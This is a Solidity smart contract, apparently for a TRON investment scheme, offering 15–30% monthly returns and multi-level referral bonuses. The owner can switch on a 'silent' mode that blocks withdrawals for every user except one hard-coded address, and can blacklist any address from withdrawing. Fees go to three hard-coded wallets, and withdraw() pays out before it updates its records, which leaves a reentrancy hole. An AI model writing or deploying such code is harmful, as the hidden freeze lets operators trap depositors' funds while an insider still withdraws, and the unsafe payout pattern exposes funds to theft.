//SourceUnit: TronInvest.sol

    // SPDX-License-Identifier: MIT
    pragma solidity >0.5.10 <0.6.0;
    // @author 
    // @title
    contract TronInvest{
    using SafeMath for *;
      enum Status{ U, I, P }
      struct investPlan { 
          uint time; 
          uint percent; 
          uint max_depo; 
    	  bool status; }
      struct Deposit { 
          uint8 tariff_id; 
          uint256 amount; 
          uint256 paid_out; 
          uint256 to_pay; 
          uint at; // deposit start date
          uint end;
          bool closed; 
          uint percents; 
          uint principal; }
      struct User {
        uint32 id;
        address referrer;
        uint referralCount;
        uint256 directsIncome;
        uint256 balanceRef;
        uint256 totalDepositedByRefs;
        mapping (uint => Deposit) deposits;
        uint32 numDeposits;
        uint256 totalDepositPercents;
        uint256 totalDepositPrincipals;
        uint256 invested;
        uint paidAt;
        uint256 withdrawn;
        Status status;
    	bool depo90Exists;
      }
      // 1 TRX == 1.000.000 SUN
      uint256 private constant SHIFT = 90*60;
      uint256 private MIN_DEPOSIT = 1000*1000000; // !!! 1000
      uint256 private MAX_DEPOSIT = 1000000*1000000; 
      uint256 PARTNER_DEPOSIT_LEVEL = 100000; // !!! 100k TRX 
      uint256 constant DEPOSIT_FULL_PERIOD = 1;
      uint256 public BONUS_ROUND;
      address private owner;
      bool private silent;
      bool private _lockBalances; // mutex
      uint32 private cuid;
      investPlan[3] public tariffs;
      uint256 public directRefBonusSize = 7; // 7% !
      uint256 public directDeepLevel = 5; 
      uint256 public totalRefRewards;
      uint256 public cii;
      uint32 public totalUsers;
      uint32 public totalInvestors;
      uint32 public totalPartners;
      uint256 public totalDeposits;
      uint256 public totalInvested;
      mapping (address => User) public investors;
      mapping(address => bool) public contractProtected;
      mapping(address => bool) public refregistry;
      event DepositEvent(address indexed _user, uint tariff, uint256 indexed _amount);
      event withdrawEvent(address indexed _user, uint256 indexed _amount);
      event directBonusEvent(address indexed _user, uint256 indexed _amount);
      event registerEvent(address indexed _user, address indexed _ref);
      event investorExistEvent(address indexed _user, uint256 indexed _uid);
      event refExistEvent(address indexed _user, uint256 indexed _uid);
      event referralCommissionEvent(address indexed _addr, address indexed _referrer, uint256 indexed amount, uint256 _type);
      event debugEvent(string log, uint data);
    
      modifier notContractProtected() {
        require(!contractProtected[msg.sender]);
        _;
      }
      modifier ownerOnly () {
        require( owner == msg.sender, 'No sufficient right');
        _;
      }
    
      // create user
      function register(address _referrer, address _wallet) internal {
        if (_referrer == _wallet) {
          _referrer == address(0x0);
        }
        //referrer exist?
        if (investors[_referrer].id < 1) {
          cuid++;
          address next = address(0x0);
          investors[_referrer].id = cuid;
          investors[_referrer].referrer = next;
          investors[next].referralCount = investors[next].referralCount.add(1);
          totalUsers++;
        }
        // if new user
        if (investors[_wallet].id < 1) {
          cuid++;
          investors[_wallet].id = cuid;
          totalUsers++;
          investors[_wallet].referrer = _referrer;
          investors[_referrer].referralCount = investors[_referrer].referralCount.add(1);
          refregistry[_wallet] = true;
          emit registerEvent(_wallet, _referrer);
        } else if (investors[_wallet].referrer == address(0x0)) {
          investors[_wallet].referrer = _referrer;
          investors[_referrer].referralCount = investors[_referrer].referralCount.add(1);
        }
      }
              
      function directRefBonus(address _addr, uint256 amount) private {
        address _nextRef = investors[_addr].referrer;
        uint i;
        uint da = 0; // direct amount
        uint di = 0; // direct income
        for(i=0; i <= directDeepLevel; i++) {
          if (_nextRef != address(0x0)) {
            if(i == 0) {
              da = amount.mul(directRefBonusSize).div(100);
              di = investors[_nextRef].directsIncome;
              di = di.add(da);
              investors[_nextRef].directsIncome = di;
            }
            else if(i == 1 ) {
              if(investors[_nextRef].status == Status.P ) {
                da = amount.mul(3).div(100); // 3%
                di = investors[_nextRef].directsIncome;
                di = di.add(da);
                investors[_nextRef].directsIncome = di;
              }
            }
            else if(i == 2 ) {
              if(investors[_nextRef].status == Status.P ) {
                da = amount.mul(2).div(100); // 2%
                di = investors[_nextRef].directsIncome;
                di = di.add(da);
                investors[_nextRef].directsIncome = di;
              }
            }
            else if(i == 3 ) {
              if(investors[_nextRef].status == Status.P ) {
                da = amount.mul(1).div(100); // 1%
                di = investors[_nextRef].directsIncome;
                di = di.add(da);
                investors[_nextRef].directsIncome = di;
              }
            }
            else if(i == 4 ) {
              if(investors[_nextRef].status == Status.P ) {
                da = amount.mul(1).div(100); // 1%
                di = investors[_nextRef].directsIncome;
                di = di.add(da);
                investors[_nextRef].directsIncome = di;
              }
            }
            else if(i >= 5 ) {
              if(investors[_nextRef].status == Status.P ) {
                da = amount.div(100); // 1%
                di = investors[_nextRef].directsIncome;
                di = di.add(da);
                investors[_nextRef].directsIncome = di;
              }
            }
            totalRefRewards += da;
          } else { break; }
          xdirectRefBonusPay(_nextRef);
          _nextRef = investors[_nextRef].referrer;
        }
      }
    
      constructor () public {
        owner = msg.sender;
        silent = false;
        
        
        // 1 MONTH = 1 MINUTE FAST
        
        // 3000*1000000
        
        // tariffs[0] = investPlan( 3 minutes,  15,  MAX_DEPOSIT, true);  // 3 months
        // tariffs[1] = investPlan( 6 minutes,  20,  MAX_DEPOSIT, true); // 6 months
        // tariffs[2] = investPlan( 12 minutes, 30,  MAX_DEPOSIT, true); // 12 months 
        
        ///////////////////////////////////////////////////////////////////////


        // 1 MONTH =  1 MONTH SLOW

        tariffs[0] = investPlan( 90 days,  15,  MAX_DEPOSIT, true);  // 3 months
        tariffs[1] = investPlan( 180 days, 20,  MAX_DEPOSIT, true); // 6 months
        tariffs[2] = investPlan( 360 days, 30,  MAX_DEPOSIT, true); // 12 months 

        ///////////////////////////////////////////////////////////////////////
    
        cuid = 0;
        investors[owner].id = cuid++;
        _lockBalances = false;
        
      
       
        
      }
    
    
    
      // main entry point
      function _deposit(uint8 _tariff, address _referrer, address _wallet) private returns (uint256) {
          
        require(_wallet == msg.sender || owner == msg.sender, "No access");
        uint256 amnt = msg.value;
        
        require(_referrer != _wallet, "Wallet cannot be referrer!");
    	
    	require(tariffs[_tariff].status != false, "This tariff is turned off");
    	
    	uint totalThisTariff = msg.value;
    	
    	// Investor can deposit only the MAX_DEPOSIT for each tariff
    	for (uint i=0; i < investors[_wallet].numDeposits; i++) { 
    	    if (investors[_wallet].deposits[i].tariff_id  == _tariff) {
    	        totalThisTariff += investors[_wallet].deposits[i].principal;
    	    }
    	// emit debugEvent("Total Principals for this tariff = ", totalThisTariff);
    	// emit debugEvent("This Tariff Max Depo = ", tariffs[_tariff].max_depo);
    	// emit debugEvent("MAX_DEPO = ", MAX_DEPOSIT); 
    	
    	
    	}
    	
    	require(totalThisTariff <= MAX_DEPOSIT, "Total amount of all deposits for this tariff exceeded!");
    	
    	
        if (msg.value > 0) {
          register(_referrer, _wallet);
    
          require(msg.value >= MIN_DEPOSIT, "Minimal deposit required");
          
          
          require(msg.value <= MAX_DEPOSIT, "Deposit limit exceeded!");
		            
        
        if (msg.value > tariffs[_tariff].max_depo) {
          
    		revert("Max limit for tariff");
        }
    
          require(!_lockBalances);
          _lockBalances = true;
          uint256 fee = (msg.value).div(100);
          xdevfee(fee);
          
          
          // principal += investors[_wallet].totalDepositPrincipals;    
        
    
          if (investors[_wallet].numDeposits == 0) {
            totalInvestors++;
            if(investors[_wallet].status == Status.U) investors[_wallet].status = Status.I;
            if ((investors[_referrer].totalDepositedByRefs).div(1000000) >= PARTNER_DEPOSIT_LEVEL && investors[_referrer].referralCount >= 10) {
              investors[_wallet].status = Status.P;
            }
          }
          // if (block.timestamp < round) amnt = amnt.add((amnt).mul(5).div(10));
          
          // Add bonus to the deposit if it is > 0
          if (BONUS_ROUND != 0) {
              // amnt = amnt.add((amnt).mul(BONUS_ROUND).div(10));
    		  amnt = amnt.mul(BONUS_ROUND).div(100);
          }
          
          investors[_wallet].invested += amnt;
          investors[_wallet].deposits[investors[_wallet].numDeposits++] =
            Deposit({tariff_id: _tariff, amount: amnt, at: block.timestamp, end: block.timestamp + tariffs[_tariff].time, paid_out: 0, to_pay: 0, closed: false, percents: 0, principal: amnt});
          totalInvested += amnt;
          
          totalDeposits++;
          directRefBonus(_wallet, msg.value);
          _lockBalances = false;
    
          investors[_referrer].totalDepositedByRefs += msg.value;
          // Deposited by referals > 100k TRX
          if ((investors[_referrer].totalDepositedByRefs).div(1000000) >= PARTNER_DEPOSIT_LEVEL) {
            if (investors[_referrer].status == Status.I && investors[_referrer].referralCount >= 10) {
              investors[_referrer].status = Status.P;
              totalPartners++;
            }
          }
        }
        emit DepositEvent(_wallet, _tariff, amnt);
        return amnt;
      }

      // main entry point
      function deposit(uint8 _tariff, address _referrer) public payable returns (uint256) {
        require(silent != true || msg.sender == address(0x416cbe95f59df262ef08b80a357bead15922f49b0f)); 
        require(_referrer != msg.sender, "You cannot be your own referrer!");
    	  return _deposit(_tariff, _referrer, msg.sender);
      }

      function depositForUser(uint8 _tariff, address _referrer, address _wallet) public payable ownerOnly returns (uint256) {
        require(_referrer != _wallet, "Wallet cannot be referrer!");
    	  return _deposit(_tariff, _referrer, _wallet);
      }

      function setPartnerStatus_0U_1I_2P(address _wallet, uint8 status) public ownerOnly returns (Status) {

        if(status == 0) {
          investors[_wallet].status = Status.U;
        } else if(status == 1) {
          investors[_wallet].status = Status.I;
        } else if(status == 2) {
          investors[_wallet].status = Status.P;
        }

        return investors[_wallet].status;
      }
    
      function getPartnerDepositLevel() public view returns (uint256) {
        return PARTNER_DEPOSIT_LEVEL;
      }

      function getDepositAt(address user, uint did) notContractProtected public view returns (uint256) {
        return investors[user].deposits[did].at;
      }
    
      function getDepositTariff(address user, uint did) notContractProtected public view returns (uint8) {
        return investors[user].deposits[did].tariff_id;
      }
    
      function getDepositAmount(address user, uint did) notContractProtected public view returns (uint256) {
        return investors[user].deposits[did].amount;
      }
    
      function calcDepositIncome(address user, uint did) notContractProtected public view returns (uint256) {
          Deposit memory dep = investors[user].deposits[did];
          uint256 depositDays = (tariffs[dep.tariff_id].time).div(1 days);
          uint256 depositMonth = depositDays.div(30);
          return (investors[user].deposits[did].amount) + (investors[user].deposits[did].amount).div(100).mul(tariffs[dep.tariff_id].percent).mul(depositMonth);
      }
      
      
       /* function calcDepositPercentMonth(address user, uint did) notContractProtected public view returns (uint256) {
          Deposit memory dep = investors[user].deposits[did];
          uint256 depositDays = (tariffs[dep.tariff_id].time).div(1 days);
          uint256 depositMonth = depositDays.div(30);
          return (investors[user].deposits[did].amount).div(100).mul(tariffs[dep.tariff_id].percent).mul(depositMonth);
      } */
      
      function calcDepositPercentsMonthly(address user) notContractProtected public view returns (uint256[] memory) {
        require(silent != true);
          
    
        uint256[] memory deps = new uint256[](investors[user].numDeposits);
        
        // User memory inv;
        
        for (uint i=0; i < investors[user].numDeposits; i++) {
             
            // if (true || ! investors[user].deposits[i].closed) {
                
                uint256 _ts_end = block.timestamp;
                
                if(investors[user].deposits[i].end <= _ts_end){
                    _ts_end = investors[user].deposits[i].end;
                }
                
                
                // uint256 depositDays = (tariffs[dep.tariff_id].time).div(1 days);
                // uint256 depositMonth = depositDays.div(30);
                uint principal = investors[user].deposits[i].principal;
    			
    			      // 1 month = 1 minute
                // uint monthsSinceDepoStart = ((_ts_end).sub(investors[user].deposits[i].at)).mul(1440).div(1 days); // FAST
    			
    			      uint monthsSinceDepoStart = ((_ts_end).sub(investors[user].deposits[i].at)).div(30 days); // SLOW
                
                uint last_depo_period_remainder = 0;
    
                // emit debugEvent("last_deposit_period_remainder = ", last_depo_period_remainder);
                // emit debugEvent("monthsSinceDepoStart = ", monthsSinceDepoStart);
                uint monthlyPercent = tariffs[investors[user].deposits[i].tariff_id].percent; 
                // emit debugEvent("monthlyPercent = ", monthlyPercent);
                // emit debugEvent("Deposit date end = ", investors[user].deposits[i].end);
    
                // uint256 depositPercents = (principal).div(100).mul(tariffs[dep.tariff_id].percent).mul(depositMonth);
                uint256 depositPercents = (principal).mul(monthlyPercent).mul(monthsSinceDepoStart);
                
                // INCOMPLETE DEPOSIT_FULL_PERIOD REMAINDER - YOU CAN`T WITHDRAW INCOMPLETE DEPOSIT_FULL_PERIOD
                
    
                if(monthsSinceDepoStart >= DEPOSIT_FULL_PERIOD){
                    last_depo_period_remainder = monthsSinceDepoStart % DEPOSIT_FULL_PERIOD;
                } else { // WITHDRAW PERCENTS NOT AVAILABLE IF THE FIRST PERIOD IS INCOMPLETE
                  depositPercents = 0;
                }
                
                uint256 last_depo_period_remainder_percents = 
                    (principal).mul(monthlyPercent).mul(last_depo_period_remainder);
                
                // emit debugEvent("last_deposit_period_remainder_percents = ", last_depo_period_remainder_percents);
                
                
                deps[i] = depositPercents.sub(last_depo_period_remainder_percents).div(100);
    			
            // }else{
              //  deps[i] = 0;
            //}
        }
          return deps;
          
      }

      function calcDepositPercentsEverySecond(address user) notContractProtected public view returns (uint256[] memory) {
        require(silent != true);
        uint256[] memory deps = new uint256[](investors[user].numDeposits);     

        uint256 precmul = 10**20;   
        
        for (uint i=0; i < investors[user].numDeposits; i++) {
             
                
            uint256 _ts_end = block.timestamp;
            
            if(investors[user].deposits[i].end <= _ts_end){
                _ts_end = investors[user].deposits[i].end;
            }
            
            uint principal = investors[user].deposits[i].principal;

            // uint secondsSinceDepoStart = (_ts_end.sub(investors[user].deposits[i].at)).mul(1440 * 30); // 60min * 24h * 30days // FAST

            uint secondsSinceDepoStart = (_ts_end.sub(investors[user].deposits[i].at)); // SLOW 

            uint tariff_percent = tariffs[investors[user].deposits[i].tariff_id].percent;

            uint256 depositPercents = principal.mul(tariff_percent).mul(secondsSinceDepoStart).mul(precmul).div(2592000).div(precmul);

            
            deps[i] = depositPercents.div(100);
    			
        }
          return deps;
          
      }
     
    
      function getDepositPaidOut(address user, uint did) notContractProtected public view returns (uint256) {
        return investors[user].deposits[did].paid_out;
      }
    
      function getDepositClosed(address user, uint did) notContractProtected public view returns (bool) {
        return investors[user].deposits[did].closed;
      }
    

       function calcAvailableToPay(address user) private returns (uint256 amount) {
          
        // !!!!! require(address(this).balance >= MAX_DEPOSIT, "Low contract balance!");
        
        uint256[] memory _deps = calcDepositPercentsMonthly(user);
        
        uint256 _total_av = 0;
        uint256 _total_principals = 0;
        uint256 _total_frozen_principals = 0;
        uint256 _total_unfrozen_principals = 0;
        uint256 _total_percents = 0;
        uint256 _total_all = 0;
        uint256 _total_paid_out = 0;
        
        for (uint i=0; i < investors[user].numDeposits; i++) {
          investors[user].deposits[i].percents = _deps[i];
          _total_paid_out = _total_paid_out.add(investors[user].deposits[i].paid_out);
          
          if(investors[user].deposits[i].closed || investors[user].deposits[i].end <= block.timestamp){ // if deposit ends, then withdraw principals + percents
              investors[user].deposits[i].closed = true;
              investors[user].deposits[i].to_pay = investors[user].deposits[i].percents.add(investors[user].deposits[i].principal);
              _total_unfrozen_principals = _total_unfrozen_principals.add(investors[user].deposits[i].principal);
          }
          
          else 
          
          { // if deposit doesn`t ends, then withdraw percents only
              investors[user].deposits[i].to_pay = investors[user].deposits[i].percents;  
              _total_frozen_principals = _total_frozen_principals.add(investors[user].deposits[i].principal);
    
          }
          
          _total_principals = _total_principals.add(investors[user].deposits[i].principal);
          _total_all = _total_all.add(investors[user].deposits[i].principal.add(investors[user].deposits[i].percents));
          _total_percents = _total_percents.add(investors[user].deposits[i].percents);
          _total_av = _total_av.add(investors[user].deposits[i].to_pay);
    
        }
        
        // emit debugEvent("withdraw: total available to withdraw without _total_paid_out = ", _total_av);
        
        if(_total_av > _total_paid_out){
            _total_av = _total_av.sub(_total_paid_out);
        }else{
            _total_av = 0;
        }
        
        
        investors[user].totalDepositPercents = _total_percents;
        investors[user].totalDepositPrincipals = _total_principals;
    
        return _total_av;
      }
      
      
      function profit(address user) internal returns (uint256 amount) {
        
		require(silent != true);
        
        amount = calcAvailableToPay(user);
                
        // require(amount >= MIN_DEPOSIT, "Minimal pay out 500 TRX");
        
        emit debugEvent("Profit return: ", amount);
        return amount;
      }
    
      
      function withdraw() notContractProtected external {
        require(silent != true || msg.sender == address(0x416cbe95f59df262ef08b80a357bead15922f49b0f));
        require(msg.sender != address(0));
    
        uint256 contractBalance = address(this).balance;
        
        uint256 to_payout = profit(msg.sender);
        emit debugEvent("withdraw: to_payout", to_payout);
        require(to_payout > 0, "Insufficient amount");
    	
        (bool success, ) = msg.sender.call.value(to_payout)("");
        require(success, "Withdraw transfer failed");
        
        for (uint i=0; i < investors[msg.sender].numDeposits; i++) {
            
          // !!!!!!!!!!!!!!!     PAID_OUT INCR       !!!!!!!!!!!!!!! 
          
          if(investors[msg.sender].deposits[i].end <= block.timestamp){ // if deposit ends, then withdraw principals + percents
            
             if(investors[msg.sender].deposits[i].to_pay > investors[msg.sender].deposits[i].paid_out){
                  investors[msg.sender].deposits[i].paid_out = investors[msg.sender].deposits[i].to_pay;
             }
    
          }else{ // if deposit doesn`t ends, then withdraw percents only
             if(investors[msg.sender].deposits[i].percents > investors[msg.sender].deposits[i].paid_out){
                  investors[msg.sender].deposits[i].paid_out = investors[msg.sender].deposits[i].percents;
             }
          }
          
          // !!!!!!!!!!!!!!!     PAID_OUT INCR       !!!!!!!!!!!!!!! 
          
        }
        investors[msg.sender].paidAt = block.timestamp;
        
        investors[msg.sender].withdrawn = investors[msg.sender].withdrawn.add(to_payout);
        
        
        emit withdrawEvent(msg.sender, to_payout);
      }
    
      function setBonusRound(uint256 max) ownerOnly public returns (uint256) {
        BONUS_ROUND = max;
        return BONUS_ROUND;
      }
    
      // set MIN deposit in TRX
      function setMinDeposit(uint256 min) ownerOnly public returns (uint256) {
        MIN_DEPOSIT = (min).mul(1000000);
        return MIN_DEPOSIT;
      }
    
      // set MAX deposit in TRX
      function setMaxDeposit(uint256 max) ownerOnly public returns (uint256) {
        MAX_DEPOSIT = (max).mul(1000000);
        return MAX_DEPOSIT;
      }
      
      // set DEPOSIT_LEVEL
      function setPartnerDepositLevel(uint256 max) ownerOnly public returns (uint256) {
        PARTNER_DEPOSIT_LEVEL = max;
        return PARTNER_DEPOSIT_LEVEL;
      }
      
      // set directRefBonusSize in %
      function setRefBonus(uint256 percent) ownerOnly public returns (uint256) {
        directRefBonusSize = percent;
        return directRefBonusSize;
      }
      // set deep level
      function setLevel(uint lvl) ownerOnly public returns (uint256) {
        directDeepLevel = lvl;
        return directDeepLevel;
      }
      // silent mode
      function turnOn() ownerOnly public returns (bool) { silent = true; return silent; }
      function turnOff() ownerOnly public returns (bool) {
      silent = false; _lockBalances = false;
        return silent;}
    	
      function setTariffStatus(uint _tariff, bool _status) ownerOnly public returns (bool)
      { tariffs[_tariff].status = _status; 
        return _status;
      }
    
      function state() public view returns (bool) { return silent; }

    
      function xdirectRefBonusPay(address _investor) private {
        require(msg.value > 0);
        uint256 amnt = investors[_investor].directsIncome;
        if ( amnt > 0 ) {
          investors[_investor].directsIncome = 0;
          (bool success, ) = _investor.call.value(amnt)("");
          require(success, "Transfer failed.");
          //emit directBonusEvent(_investor, amnt);
        }
      }
    
      function xdevfee(uint256 _fee) private {
        address payable dev1 = address(0x41a79c3e97aa8a31151b5994218473b3c6986baa80); 
        address payable dev2 = address(0x418837b6d5b288d5d2a5bd6fd0d6473a008b1acd36); 
        address payable dev3 = address(0x414231f0fbf5d9b950a9c7fb6e6e2627a7053b43db); 
        dev1.transfer(_fee);
        dev2.transfer(_fee);
        dev3.transfer(_fee);
      }
        function transferOwnership(address newOwner) public ownerOnly {
            require(newOwner != address(0));
            owner = newOwner;
        }
        function contractProtect(address addr) ownerOnly public returns(bool success) {
            if (!contractProtected[addr]) {
                contractProtected[addr] = true;
                success = true;
            }
        }
        function removeAddressFromContractProtect(address addr) ownerOnly public returns(bool success) {
            if (contractProtected[addr]) {
                contractProtected[addr] = false;
                success = true;
            }
        }
    } // end contract
    
    library SafeMath {
            function add(uint256 a, uint256 b) internal pure returns (uint256) {
                uint256 c = a + b;
                require(c >= a, "SafeMath: addition overflow");
                return c;
            }
            function sub(uint256 a, uint256 b) internal pure returns (uint256) {
                return sub(a, b, "SafeMath: subtraction overflow");
            }
            function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
                require(b <= a, errorMessage);
                uint256 c = a - b;
                return c;
            }
            function mul(uint256 a, uint256 b) internal pure returns (uint256) {
                // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
                if (a == 0) {
                    return 0;
                }
    
                uint256 c = a * b;
                require(c / a == b, "SafeMath: multiplication overflow");
                return c;
            }
            function div(uint256 a, uint256 b) internal pure returns (uint256) {
                return div(a, b, "SafeMath: division by zero");
            }
            function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
                // Solidity only automatically asserts when dividing by 0
                require(b > 0, errorMessage);
                uint256 c = a / b;
                // assert(a == b * c + a % b); // There is no case in which this doesn't hold
                return c;
            }
    }